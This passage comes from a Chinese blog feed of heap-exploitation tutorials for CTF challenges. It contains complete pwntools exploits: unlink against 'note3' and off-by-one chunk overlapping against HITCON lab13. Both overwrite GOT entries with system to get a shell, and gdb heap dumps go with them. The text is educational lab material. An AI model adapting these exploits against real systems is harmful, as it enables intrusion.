class="number">2</span>)</span><br></pre></td></tr></table></figure><p><strong>这里有坑，切记，不能删掉idx1在进行覆盖，会报错，至于具体报错原因我不清楚，我估计是fastbin链上修改成了错误的fd指针，检测到了，这个问题待解决</strong></p><p>简单的unlink</p><ol start="3"><li>这里我利用了上一道题的思路，一样的做，修改idx0指向idx1指针部分，通过修改idx0，然后达到任意地址写</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">atol_got = elf.got[<span class="string">'atol'</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(ptr+<span class="number">8</span>) + p64(elf.got[<span class="string">'free'</span>]) </span><br><span class="line"><span class="comment">#payload = 'a'*0x18 + p64(free_got) + p64(puts_got)</span></span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line"><span class="comment">#edit(0, p64(puts_plt)[:-1])</span></span><br><span class="line">edit(<span class="number">1</span>, p64(elf.plt[<span class="string">'puts'</span>])[:<span class="number">-1</span>]) <span class="comment">#关键点，切记，不能破坏到下一个地址，不然会出错</span></span><br><span class="line"><span class="comment">#delete(1)</span></span><br><span class="line">edit(<span class="number">0</span>, p64(atol_got))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">atol_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc_base = atol_addr - libc.symbols[<span class="string">'atol'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">io.success(<span class="string">"atol_got: 0x%x"</span> % atol_got)</span><br></pre></td></tr></table></figure><ol start="4"><li>getshell</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">0</span>, p64(atoi_got))</span><br><span class="line">edit(<span class="number">1</span>, p64(system_addr)[:<span class="number">-1</span>])</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(<span class="string">"/bin/sh;#"</span>)</span><br></pre></td></tr></table></figure><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'note3'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'note3'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the length of the note content:(less than 1024)\n"</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the note content:\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the id of the note:\n"</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the new content:\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the id of the note:\n"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    add(<span class="number">0</span>, <span class="string">'a'</span>*<span class="number">0x8</span>) <span class="comment">#idx0</span></span><br><span class="line">    add(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x8</span>) <span class="comment">#idx1</span></span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">'c'</span>*<span class="number">0x80</span>) <span class="comment">#idx2</span></span><br><span class="line">    ptr = <span class="number">0x6020c8</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x30</span>, <span class="string">'a'</span>)</span><br><span class="line">    payload += p64(<span class="number">0x30</span>)</span><br><span class="line">    payload += p64(<span class="number">0x90</span>)</span><br><span class="line">    edit(<span class="number">0</span>, payload)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">    atol_got = elf.got[<span class="string">'atol'</span>]</span><br><span class="line">    atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(ptr+<span class="number">8</span>) + p64(elf.got[<span class="string">'free'</span>]) </span><br><span class="line">    <span class="comment">#payload = 'a'*0x18 + p64(free_got) + p64(puts_got)</span></span><br><span class="line">    edit(<span class="number">0</span>, payload)</span><br><span class="line">    <span class="comment">#edit(0, p64(puts_plt)[:-1])</span></span><br><span class="line">    edit(<span class="number">1</span>, p64(elf.plt[<span class="string">'puts'</span>])[:<span class="number">-1</span>])</span><br><span class="line">    <span class="comment">#delete(1)</span></span><br><span class="line">    edit(<span class="number">0</span>, p64(atol_got))</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    atol_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    libc_base = atol_addr - libc.symbols[<span class="string">'atol'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    io.success(<span class="string">"atol_got: 0x%x"</span> % atol_got)</span><br><span class="line">    edit(<span class="number">0</span>, p64(atoi_got))</span><br><span class="line">    edit(<span class="number">1</span>, p64(system_addr)[:<span class="number">-1</span>])</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    io.sendline(<span class="string">"/bin/sh;#"</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>unlink部分完结了</li><li>unlink部分学习时间4天，现在对于unlink轻车熟路了，不过通常不是单一漏洞点，单一的好分析点</li><li>要多学学逆向，逆向起复杂的题目来真的难，像那个机器人那题，我连漏洞点都找不到，真的惨</li><li>我觉得机器人那题还有另外解法，因为4和5选项越界部分都没用上</li><li>感谢萝卜师傅的指导</li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNDcwMDcuaHRt" title="https://bbs.pediy.com/thread-247007.htm">看雪大佬<i class="fa fa-external-link"></i></span></p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/6a76efc5/">https://noone-hub.github.io/posts/6a76efc5/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆入门系列教程3</title>
    <url>/posts/f4127a66/</url>
    <content><![CDATA[<h1 id="pwn堆入门系列教程3"><a href="#pwn堆入门系列教程3" class="headerlink" title="pwn堆入门系列教程3"></a>pwn堆入门系列教程3</h1><p>本文首发于先知社区</p><p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjA4Nw==" title="https://xz.aliyun.com/t/6087">pwn堆入门系列教程1<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjE2OQ==" title="https://xz.aliyun.com/t/6169">pwn入门系列教程2<i class="fa fa-external-link"></i></span></p><p>序言：这次终于过了off-by-one来到了Chunk Extend / Overlapping,这部分在上一节也进行了学习，所以难度相对来说不会是那么大，刚起初我以为，因为第一题很简单，但做到第二题，我发觉我连格式化字符串的漏洞都不会利用，真的是太菜了，后面看了看雪大佬的文章才会做</p><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><h2 id="1-1-HITCON-Trainging-lab13"><a href="#1-1-HITCON-Trainging-lab13" class="headerlink" title="1.1. HITCON Trainging lab13"></a>1.1. HITCON Trainging lab13</h2><p>这道题还是相对简单的，对于前面几道来说，上一道已经用过这种方法了，而且比这复杂许多，所以差不多了，不过还有些小细节注意下就好</p><h3 id="1-1-1-功能分析"><a href="#1-1-1-功能分析" class="headerlink" title="1.1.1. 功能分析"></a>1.1.1. 功能分析</h3><p>引用于ctf-wiki</p><ol><li>创建堆，根据用户输入的长度，申请对应内存空间，并利用 read 读取指定长度内容。这里长度没有进行检测，当长度为负数时，会出现任意长度堆溢出的漏洞。当然，前提是可以进行 malloc。此外，这里读取之后并没有设置 NULL。</li><li>编辑堆，根据指定的索引以及之前存储的堆的大小读取指定内容，但是这里读入的长度会比之前大 1，所以会存在 off by one 的漏洞。</li><li>展示堆，输出指定索引堆的大小以及内容。</li><li>删除堆，删除指定堆，并且将对应指针设置为了 NULL。</li></ol><h3 id="1-1-2-漏洞点分析"><a href="#1-1-2-漏洞点分析" class="headerlink" title="1.1.2. 漏洞点分析"></a>1.1.2. 漏洞点分析</h3><p>漏洞点存在off-by-one,通过off-by-one进行overlapping就成了</p><h3 id="1-1-3-漏洞利用过程"><a href="#1-1-3-漏洞利用过程" class="headerlink" title="1.1.3. 漏洞利用过程"></a>1.1.3. 漏洞利用过程</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/50gx 0x1775030-0x30</span><br><span class="line">0x1775000:	0x0000000000000000	0x0000000000000021 <span class="comment">#结构体1</span></span><br><span class="line">0x1775010:	0x0000000000000018	0x0000000001775030</span><br><span class="line">0x1775020:	0x0000000000000000	0x0000000000000021 <span class="comment">#数据块1 chunk</span></span><br><span class="line">0x1775030:	0x0000000a31313131	0x0000000000000000</span><br><span class="line">0x1775040:	0x0000000000000000	0x0000000000000021 <span class="comment">#结构体1</span></span><br><span class="line">0x1775050:	0x0000000000000010	0x0000000001775070</span><br><span class="line">0x1775060:	0x0000000000000000	0x0000000000000021 <span class="comment">#数据块2 chunk</span></span><br><span class="line">0x1775070:	0x0000000a32323232	0x0000000000000000</span><br><span class="line">0x1775080:	0x0000000000000000	0x0000000000020f81</span><br><span class="line">0x1775090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x17750a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x17750b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x17750c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x17750d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x17750e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x17750f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775180:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure><p>攻击过程：</p><ol><li>创建两个堆块初始化(实际创了4个堆块，两个结构体堆块，两个数据堆块)至于一个为什么要0x18，因为要利用他会使用下个chunk的pre_size作为数据部分，这样才能off-by-one溢出到size</li><li>编辑第0块堆块，利用off-by-one覆盖第二块堆块的size，修改size为0x41<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x8a5030</span><span class="number">-0x30</span></span><br><span class="line"><span class="number">0x8a5000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x8a5010</span>:	<span class="number">0x0000000000000018</span>	<span class="number">0x00000000008a5030</span></span><br><span class="line"><span class="number">0x8a5020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x8a5030</span>:	<span class="number">0x0068732f6e69622f</span>	<span class="number">0x6161616161616161</span> #/bin/sh为后面做准备</span><br><span class="line"><span class="number">0x8a5040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x0000000000000041</span> <span class="meta"># off-by-one</span></span><br><span class="line"><span class="number">0x8a5050</span>:	<span class="number">0x0000000000000010</span>	<span class="number">0x00000000008a5070</span></span><br><span class="line"><span class="number">0x8a5060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x8a5070</span>:	<span class="number">0x0000000a32323232</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020f81</span></span><br><span class="line"><span class="number">0x8a5090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a50a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a50b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a50c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a50d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a50e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a50f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5110</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5120</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5170</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5180</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></li><li>free掉第1块，这时候free了一个0x40大小的堆块和一个0x20大小的堆块<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0xf89030</span><span class="number">-0x30</span></span><br><span class="line"><span class="number">0xf89000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0xf89010</span>:	<span class="number">0x0000000000000018</span>	<span class="number">0x0000000000f89030</span></span><br><span class="line"><span class="number">0xf89020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0xf89030</span>:	<span class="number">0x0068732f6e69622f</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0xf89040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x0000000000000041</span> <span class="meta">#free 0x40大小</span></span><br><span class="line"><span class="number">0xf89050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000f89070</span></span><br><span class="line"><span class="number">0xf89060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> <span class="meta">#free 0x21大小</span></span><br><span class="line"><span class="number">0xf89070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020f81</span></span><br><span class="line"><span class="number">0xf89090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf890a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf890b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf890c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf890d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf890e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf890f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89110</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89120</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89170</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf89180</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></li><li>这时候create(0x30)的话，会先创建结构体的堆块，这时候fastbin链上有刚free掉的堆块，所以优先使用，创建了0x20大小堆块，然后在创建一个0x40的chunk，这时候可以覆盖掉他的结构体部分的内容指针，泄露地址，在写入就成了</li></ol><h3 id="1-1-4-exp"><a href="#1-1-4-exp" class="headerlink" title="1.1.4. exp"></a>1.1.4. exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'heapcreator'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'heapcreator'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = ctx.start()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e.args)</span><br><span class="line">        print(<span class="string">"It can't work,may be it can't load the remote libc!"</span>)</span><br><span class="line">        print(<span class="string">"It will load the local process"</span>)</span><br><span class="line">        io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line">heap = elf</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    free_got = <span class="number">0x602018</span></span><br><span class="line">    create(<span class="number">0x18</span>, <span class="string">"1111"</span>)  <span class="comment"># 0</span></span><br><span class="line">    create(<span class="number">0x10</span>, <span class="string">"2222"</span>)  <span class="comment"># 1</span></span><br><span class="line">    <span class="comment"># overwrite heap 1's struct's size to 0x41</span></span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"a"</span> * <span class="number">0x10</span> + <span class="string">"\x41"</span>)</span><br><span class="line">    <span class="comment"># trigger heap 1's struct to fastbin 0x40</span></span><br><span class="line">    <span class="comment"># heap 1's content to fastbin 0x20</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># new heap 1's struct will point to old heap 1's content, size 0x20</span></span><br><span class="line">    <span class="comment"># new heap 1's content will point to old heap 1's struct, size 0x30</span></span><br><span class="line">    <span class="comment"># that is to say we can overwrite new heap 1's struct</span></span><br><span class="line">    <span class="comment"># here we overwrite its heap content pointer to free@got</span></span><br><span class="line">    create(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x30</span>) + p64(heap.got[<span class="string">'free'</span>]))  <span class="comment">#1</span></span><br><span class="line">    <span class="comment">#create(0x30, p64(0x1234567890))  #1</span></span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    <span class="comment"># leak freeaddr</span></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"Content : "</span>)</span><br><span class="line">    data = r.recvuntil(<span class="string">"Done !"</span>)</span><br><span class="line"></span><br><span class="line">    free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">    libc_base = free_addr - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">    log.success(<span class="string">'libc base addr: '</span> + hex(libc_base))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    <span class="comment">#gdb.attach(r)</span></span><br><span class="line">    <span class="comment"># overwrite free@got with system addr</span></span><br><span class="line">    edit(<span class="number">1</span>, p64(system_addr))</span><br><span class="line">    <span class="comment"># trigger system("/bin/sh")</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure><h2 id="1-2-2015-hacklu-bookstore"><a href="#1-2-2015-hacklu-bookstore" class="headerlink" title="1.2. 2015 hacklu bookstore"></a>1.2. 2015 hacklu bookstore</h2><h3 id="1-2-1-功能分析"><a href="#1-2-1-功能分析" class="headerlink" title="1.2.1. 功能分析"></a>1.2.1. 功能分析</h3><p>先进行功能分析</p><ol><li>有编辑功能，编辑已存在的1,2堆块，可溢出</li><li>删除功能，删除已存在的1,2堆块，uaf</li><li>合并功能，将1,2两个堆块合并,格式化字符串</li></ol><h3 id="1-2-2-漏洞点分析"><a href="#1-2-2-漏洞点分析" class="headerlink" title="1.2.2. 漏洞点分析"></a>1.2.2. 漏洞点分析</h3><ol><li>漏洞点1(任意写，\n才结束)</li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">edit_order</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> cnt; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 